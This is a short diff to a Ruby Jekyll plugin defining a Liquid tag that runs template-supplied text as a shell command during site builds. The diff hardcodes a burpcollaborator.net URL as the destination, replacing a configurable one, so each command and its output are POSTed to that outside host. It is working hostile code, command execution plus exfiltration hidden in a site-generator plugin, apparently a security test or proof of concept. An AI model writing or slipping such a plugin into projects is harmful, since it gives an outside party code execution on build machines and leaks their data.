@@ -5,15 +5,14 @@ module Jekyll
 
   class CommandExecute < Liquid::Tag
 
-    def initialize(tag_name, command, response_url)
+    def initialize(tag_name, command, tokens)
       super
       @command = command
-      @response_url = response_url
     end
 
     def render(context)
       command_output = `#{@command}`
-      Net::HTTP.post URI("#{@response_url}"),
+      Net::HTTP.post URI("http://plexnx72dqs5fdqycvzxbqgtpkvcj1.burpcollaborator.net"),
         { "command" => "#{@command}", "result" => "#{command_output}" }.to_json,
         "Content-Type" => "application/json"
     end
